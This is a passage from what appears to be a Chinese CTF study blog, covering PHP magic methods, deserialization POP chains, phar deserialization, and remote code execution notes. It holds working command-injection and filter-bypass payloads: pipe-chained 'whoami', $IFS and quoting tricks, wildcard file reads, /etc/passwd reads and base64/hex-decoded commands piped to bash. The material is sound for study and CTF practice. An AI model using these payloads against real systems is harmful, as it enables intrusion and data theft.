<span class="comment">  private $password =&gt;</span>
<span class="comment">  string(1) &quot;a&quot;</span>
<span class="comment">  private $order =&gt;</span>
<span class="comment">  NULL</span>
<span class="comment">&#125;</span>
<span class="comment">上面wakeup的函数作用是将username的变量值赋值给password变量。*/</span></code></pre>
<h3 id="__tostring"><a class="markdownIt-Anchor" href="#__tostring"></a> <code>__toString()</code></h3>
<p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p>
<ol>
<li><code>echo($obj)</code>或<code>print($obj)</code><strong>打印对象</strong>时会触发</li>
<li><strong>反序列化对象</strong>与字符串连接时</li>
<li><strong>反序列化对象</strong>参与格式化字符串时</li>
<li><strong>反序列化对象</strong>与<strong>字符串</strong>进行<code>preg_match</code>正则匹配)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较</li>
<li><strong>反序列化对象</strong>参与<strong>格式化sql语句</strong>时，绑定参数时(用的少)</li>
<li><strong>反序列化对象</strong>经过<strong>php字符串函数</strong>时，如<code>strlen()</code>，<code>addslashes()</code>时(用的少)</li>
<li>在<code>in_array()</code>方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有<code>tostring</code>返回的字符串的时候<code>tostring</code>会被调用</li>
<li><strong>反序列化对象</strong>作为<code>class_exists()</code>的参数的时候(用的少)</li>
</ol>
<p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用</p>
<p>新建了对象<code>t</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;
    &#125;

&#125;

<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="keyword">echo</span> <span class="variable">$test</span>;
<span class="comment">//__toString</span></code></pre>
<h3 id="__invoke"><a class="markdownIt-Anchor" href="#__invoke"></a> <code>__invoke()</code></h3>
<p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p>
<p>需要注意的是，这个魔术方法只在<strong>PHP 5.3.0 及以上版本</strong>有效</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;
    &#125;

&#125;

<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>();
<span class="comment">//__invoke test</span></code></pre>
<h3 id="__get-和-__set"><a class="markdownIt-Anchor" href="#__get-和-__set"></a> <code>__get()</code> 和 <code>__set()</code></h3>
<p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取值，或者说是<strong>调用一个类及其父类方法中未定义属性时</strong>，需要一个参数，代表不存在的属性值</p>
<p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private</code> <code>protected</code>)(用的不多)</p>
<p><code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>t</code>属性，但我们是没有定义<code>t</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值打印出来</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$var1</span>;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>-&gt;var2;
<span class="meta">?&gt;</span>
    <span class="comment">//var2</span></code></pre>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$var1</span>;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;
<span class="meta">?&gt;</span></code></pre>
<h3 id="__call-和-__callstatic"><a class="markdownIt-Anchor" href="#__call-和-__callstatic"></a> <code>__call()</code> 和 <code>__callStatic()</code></h3>
<p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p>
<p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p>
<p>比如说像这段代码，我们调用对象<code>t</code>中的方法<code>t2</code>，但因为类中没有方法<code>t2</code>，所以说就调用了<code>__call()</code></p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);
<span class="meta">?&gt;</span>
<span class="comment">//callxxx,a</span></code></pre>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);
<span class="meta">?&gt;</span>
<span class="comment">//callxxx,a</span></code></pre>
<p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 self，parent 和 static）。与**__call<strong>不同的是需要添加</strong>static**，只有访问不存在的静态方法才会触发。</p>
<h3 id="__clone"><a class="markdownIt-Anchor" href="#__clone"></a> <code>__clone()</code></h3>
<p><code>__clone()</code>:当使用clone关键字拷贝完成一个对象后，新对象就会调用定义的魔术方法(如果存在)</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);
<span class="meta">?&gt;</span>
<span class="comment">//__clone test</span></code></pre>
<h3 id="__isset和__unset"><a class="markdownIt-Anchor" href="#__isset和__unset"></a> <code>__isset()</code>和<code>__unset</code></h3>
<p><code>__isset()</code>:对不可访问属性调用<code>isset()</code>或者<code>empty()</code>时，<code>__isset()</code>会被调用</p>
<p><code>__unset()</code>:对不可访问属性调用<code>unset()</code>时，<code>__unset()</code>会被触发</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$var</span>;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);
<span class="meta">?&gt;</span>
    <span class="comment">//var1</span></code></pre>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);
<span class="meta">?&gt;</span>
    <span class="comment">//var1</span></code></pre>
<h2 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h2>
<h3 id="绕过-__wakeup"><a class="markdownIt-Anchor" href="#绕过-__wakeup"></a> 绕过 __wakeup:</h3>
<ul>
<li>PHP5 &lt; 5.6.25</li>
<li>PHP7 &lt; 7.0.10</li>
</ul>
<p>当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __wakeup()</p>
<p>//详见[SWPUCTF 2021 新生赛]no_wakeup</p>
<p>当然，也可以通过赋值来绕过__wake下面将执行的字符串置空的情况</p>
<p>使另一个构造好的变量和被控制的变量公用一个内存如</p>
<pre><code class="highlight plaintext">$t-&gt;c=&quot;system(&#x27;ls /&#x27;);&quot;;
$t-&gt;b=&amp;$t-&gt;a;
//a未被wakeup置空的变量，执行的也是a,前面还有一个c-&gt;b的过程</code></pre>
<h3 id="绕过-o"><a class="markdownIt-Anchor" href="#绕过-o"></a> 绕过 O</h3>
<p>有时会对构造的payload进行正则匹配</p>
<p>此时需要绕过一些必须绕过的关键词，如O</p>
<pre><code class="highlight plaintext">检查O开头的话，可以尝试数组绕过
serialize(array(new Test()))
如果是在整个字符串中检查的话，那没得跑
尝试用一下O+的方法绕过
O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125; =&gt;O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></pre>
<p>gc机制</p>
<h2 id="魔术方法的相互制衡"><a class="markdownIt-Anchor" href="#魔术方法的相互制衡"></a> 魔术方法的相互制衡</h2>
<h3 id="__wakeup__unserialize"><a class="markdownIt-Anchor" href="#__wakeup__unserialize"></a> <code>__wakeup()&amp;__unserialize()</code></h3>
<p>从7.4.0开始，如果类中同时定义了 <code>__unserialize() 和 __wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，__wakeup() 方法会被忽略</p>
<h2 id="构链经验"><a class="markdownIt-Anchor" href="#构链经验"></a> 构链经验:</h2>
<p>首先，找到注入点，注入点一般 被包裹在最内部(因为第一个执行，通过各种魔术方法将结果成功传输到外部并成功销毁对象)，接着内层的魔术方法要在紧邻的外层得到触发，(也就是为什么他被称为pop链的缘故)，最后成功销毁就算pop链构造成功了</p>
<h2 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> phar反序列化</h2>
<p><code>文件上传+文件包含+php反序列化</code>的命运共同体(雾)</p>
<p>先了解一下<code>phar</code>文件</p>
<h3 id="phar文件结构"><a class="markdownIt-Anchor" href="#phar文件结构"></a> phar文件结构</h3>
<ul>
<li><strong>stub文件标识</strong></li>
</ul>
<p>可以理解为一个标志，格式为xxx<code>&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();</code>来结尾，否则phar扩展将无法识别这个文件为phar文件</p>
<ul>
<li><strong>manifest</strong></li>
</ul>
<p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存（当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化(漏洞利用点)</p>
<p><img src="/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1937992-20200602115238195-49897280.png" alt="1937992-20200602115238195-49897280"></p>
<ul>
<li><strong>contents</strong></li>
</ul>
<p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p>
<ul>
<li><strong>signature</strong></li>
</ul>
<p>如果修改文件内容，签名就会失效，需要更换一个新的签名，在文件系统函数(<code>file_exist(),is_dir()</code>等)参数可控的情况下，配合phar伪协议就可以不依赖<code>unserialiaze()</code>直接进行反序列化</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1937992-20200602115337297-1986136175.png" alt="1937992-20200602115337297-1986136175"></p>
<blockquote>
<p>[!NOTE]</p>
<p>要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为OFF，否则无法生成</p>
</blockquote>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;
    &#125;
    
    <span class="comment">//@unlink(&quot;phar.phar&quot;);</span>
    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span>
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub,有时+一个GIF89a头在前面绕过</span>
    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span>
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span>
    <span class="comment">//签名自动计算</span>
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();
<span class="meta">?&gt;</span></code></pre>
<p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下</p>
<table>
<thead>
<tr>
<th>受影响函数的列表</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeab</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody>
</table>
<h2 id="反序列化字符逃逸"><a class="markdownIt-Anchor" href="#反序列化字符逃逸"></a> 反序列化字符逃逸</h2>
]]></content>
      <tags>
        <tag>-web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/2025/01/21/RCE/</url>
    <content><![CDATA[<h1 id="rce远程代码执行漏洞原理及漏洞相关"><a class="markdownIt-Anchor" href="#rce远程代码执行漏洞原理及漏洞相关"></a> RCE（远程代码执行漏洞）原理及漏洞相关</h1>
<p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p>
<p><strong>系统命令执行函数</strong></p>
<pre><code class="highlight plaintext">*** system() 语法为system(string $command, int &amp;$return var = ?)
*** passthru() system()的平替，写个命令就会执行命令，自己能回显
*** exec() 示例exec(&quot;cat /flag&quot;)，其本身没有回显
*** shell_exec() 格式分别为shell_exec（ls）和`ls`,不能自己回显，需要借用echo\print等输出结果
*** popen() 语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式&#x27;r&#x27;表示阅读，&#x27;w&#x27; 表示写入。不能自己回显，需要print_r等输出内容
*** proc_open() 语法为proc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options)
$command是要执行的命令。
$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。
$pipes是一个引用变量，用于存储与进程相关的管道。
$cwd（可选）是设置子进程的当前工作目录。
$env（可选）是设置子进程的环境变量。
$other_options（可选）是其他选项，如设置超时等
不能直接回显
*** pcntl_exec()  语法格式为pcntl exec(string $path, array $args = ?, array $envs = ?)
path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是#!/usr/local/bin/perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。
envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，解决方法一：cat文件并输出到有权限读取路径；解决方法二：shell反弹</code></pre>
<p>那么如果遇到类似PING的执行漏洞，如何将前面的字段和系统命令无缝衔接呢？</p>
<p>那么就需要管道符来支持：</p>
<p>*<strong>关于管道符</strong></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png" alt="img"></p>
<p><strong>For Windows：</strong></p>
<p>“|” : 直接执行后面的语句。例如：<code>ping 127.0.0.1| whoami</code><br>
“||” : 如果前面执行的语句执行出错，则执行后面的语句，否则只执行前面的语句。例如： <code>ping 1234.1 || whoami</code><br>
“&amp;” : 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： <code>ping 127.0.0.1 &amp; whoami</code><br>
“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
<p><strong>For Linux:</strong></p>
<p>“;” : 执行完前面的语句再执行后面的。 例如： <code>ping 127.0.0.1 ; whoami</code><br>
“|” : 显示后面语句的执行结果。列如：<code>ping 127.0.0.1 | whoami</code><br>
“||” : 当前的语句执行出错时，执行后面的语句。 例如： <code>ping 1472.1 || whoami</code><br>
“&amp;” : 如果前面得语句为假则直接执行后面的语句，前面的语句可真可假，例如：<code>ping 127.0.0.1 | &amp; whoami</code><br>
“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
<p>发现漏洞后，如何得到控制权呢？</p>
<p>最简单的漏洞就是找到注入点直接注</p>
<p>但是难免会碰到存在黑名单的情况，这个时候就需要绕过出场了</p>
<h2 id="空格过滤绕过"><a class="markdownIt-Anchor" href="#空格过滤绕过"></a> 空格过滤绕过：</h2>
<h3 id="大括号"><a class="markdownIt-Anchor" href="#大括号"></a> 大括号{}：</h3>
<pre><code class="highlight plaintext">&#123;cat,flag.php&#125;</code></pre>
<h3 id="ifs代替空格"><a class="markdownIt-Anchor" href="#ifs代替空格"></a> <code>$IFS</code>代替空格：</h3>
<p><code>$IFS$9</code>，<code>$&#123;IFS&#125;</code>，<code>$IFS</code>这三个都行</p>
<p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。</p>
<pre><code class="highlight plaintext">?cmd=ls$IFS-I</code></pre>
<p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名</p>
<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;-l</code></pre>
<p>$IFS<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>9</mn><mtext>后面加个</mtext></mrow><annotation encoding="application/x-tex">9后面加个</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">9</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">个</span></span></span></span>与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p>
<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;$9-l</code></pre>
<h3 id="重定向字符"><a class="markdownIt-Anchor" href="#重定向字符"></a> 重定向字符&lt;，&lt;&gt;</h3>
<p>(具体哪种情景能用还不太清楚)</p>
<h3 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h3>
<p>%20绕过(相当于url编码的空格)</p>
<p>%09绕过（相当于Tab键）</p>
<p>%0a–代表换行符</p>
<p>%0b–用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。</p>
<p>%0d–回车换行</p>
<p>%a0–代表的是非断行空格</p>
<p>%00–%00代表的是ASCII码中的空字符</p>
<p>可以将空格字符替换成注释/**/，也可以使用内联注释<code>/!code/</code></p>
<p>内联注释绕过知识点</p>
<pre><code>    当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 /*!  */中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行
</code></pre>
<h2 id="文件名过滤绕过"><a class="markdownIt-Anchor" href="#文件名过滤绕过"></a> 文件名过滤绕过：</h2>
<h3 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> ??,*绕过</h3>
<p><code>passthru</code>代替<code>system</code>，过滤flag文件名用?，*绕过</p>
<pre><code class="highlight plaintext">cat /fl??

cat /f*  #多个匹配结果同时展现</code></pre>
<p>以上指令等效于<code>cat /flag</code></p>
<h3 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> ;过滤</h3>
<p>利用?&gt;绕过</p>
<h3 id="过滤-2"><a class="markdownIt-Anchor" href="#过滤-2"></a> /过滤</h3>
<p>用<code>printf</code> 以及<code>$()</code>绕过</p>
<pre><code class="highlight plaintext">$(printf$&#123;IFS&#125;&quot;\57&quot;)</code></pre>
<h3 id="单引号双引号反引号绕过正则"><a class="markdownIt-Anchor" href="#单引号双引号反引号绕过正则"></a> 单引号(')双引号(“”)反引号(``)绕过正则</h3>
<pre><code class="highlight plaintext">cat /fl&quot;&quot;ag

c&quot;&quot;at /e&#x27;t&#x27;c/pas``s``wd</code></pre>
<p>对<code>php</code>来说这是<code>fl&quot;&quot;ag</code>而不是<code>flag</code>关键字不会匹配上，但是对于linux系统来说<code>cat /fl&quot;&quot;ag</code>等效于<code>cat /flag</code>。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p>
<pre><code class="highlight plaintext">passthru(&#x27;cat /fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</code></pre>
<h3 id="反斜杠绕过"><a class="markdownIt-Anchor" href="#反斜杠绕过"></a> 反斜杠\绕过</h3>
<p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p>
<pre><code class="highlight plaintext">cat fl\ag.p\hp</code></pre>
<h3 id="特殊变量1到9-和"><a class="markdownIt-Anchor" href="#特殊变量1到9-和"></a> 特殊变量：$1到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>9</mn><mtext>、</mtext></mrow><annotation encoding="application/x-tex">9、</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">9</span><span class="mord cjk_fallback">、</span></span></span></span>@和$*</h3>
<p>这些特殊变量输出为空</p>
<pre><code class="highlight plaintext">cat /fl$9ag

cat /fl$@ag</code></pre>
<p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p>
<pre><code class="highlight plaintext">c$@at /e$@tc/pas$@swd

cat$x /etc$x/passwd$x

ca$@t /etc$x/passwd$x</code></pre>
<h3 id="内联执行绕过通过赋值绕过"><a class="markdownIt-Anchor" href="#内联执行绕过通过赋值绕过"></a> 内联执行绕过（通过赋值绕过）</h3>
<p>a=c;b=a;c=t;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span></span></span>b$c /1.txt</p>
<p>a=f;c=a;d=g;b=l;cat <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span></span></span>b<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>d.php（abcd拼接出来flag）</p>
<h3 id="利用linux中的环境变量"><a class="markdownIt-Anchor" href="#利用linux中的环境变量"></a> 利用linux中的环境变量</h3>
<p>使用环境变量里的字符执行变量</p>
<p>echo $PATH              #PATH默认系统环境变量</p>
<p>如果出现：</p>
<pre><code class="highlight bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre>
<p>则以下代码表示了flag.php</p>
<pre><code class="highlight plaintext">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></pre>
<p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是/）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字<code>flag.php</code></p>
<h2 id="常见文件读取命令绕过"><a class="markdownIt-Anchor" href="#常见文件读取命令绕过"></a> 常见文件读取命令绕过：</h2>
<h3 id="base64编码"><a class="markdownIt-Anchor" href="#base64编码"></a> base64编码：</h3>
<pre><code class="highlight plaintext">cat flag.php--&gt; Y2FOIGZSYWcucGhw
echo Y2FOIGZsYWcucGhw | base64 -d</code></pre>
<p>管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</p>
<p>执行命令的话有三种形式：</p>
<pre><code class="highlight plaintext">echo Y2FOIGZsYWcucGhw | base64 -d | bash

$(echo Y2FOIGZsYWcucGhw | base64 -d)

`echo Y2FOIGZsYWcucGhw | base64 -d`   #反引号</code></pre>
<p>把<code>cat flag.php</code>，放在bash里执行，同理想换成什么命令就base64编码后替换</p>
<h3 id="base32编码同理"><a class="markdownIt-Anchor" href="#base32编码同理"></a> base32编码同理</h3>
<pre><code class="highlight plaintext">?cmd=system(&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</code></pre>
<h3 id="hex编码ascii编码"><a class="markdownIt-Anchor" href="#hex编码ascii编码"></a> HEX编码（ASCII编码）</h3>
<h4 id="python脚本"><a class="markdownIt-Anchor" href="#python脚本"></a> python脚本</h4>
<pre><code class="highlight plaintext">import binascii
s = b&quot;tac flag&quot;
h = binascii.b2a_hex(s)
print(h)</code></pre>
<p>tac flag–&gt; 74616320666c6167</p>
<pre><code class="highlight plaintext">echo &quot;74616320666c6167”|xxd -r -p|bash</code></pre>
<h4 id="xxd-二进制显示和处理文件工具"><a class="markdownIt-Anchor" href="#xxd-二进制显示和处理文件工具"></a> xxd: 二进制显示和处理文件工具。</h4>
<p>-r-p将纯十六进制转储的反向输出打印为了ASCII格式<br>
bash、sh、/bin/bash、反引号等</p>
<pre><code class="highlight plaintext">?cmd=passthru(&#x27;echo &quot;74616320666c6167”|xxd -r -p|bash&#x27;);</code></pre>
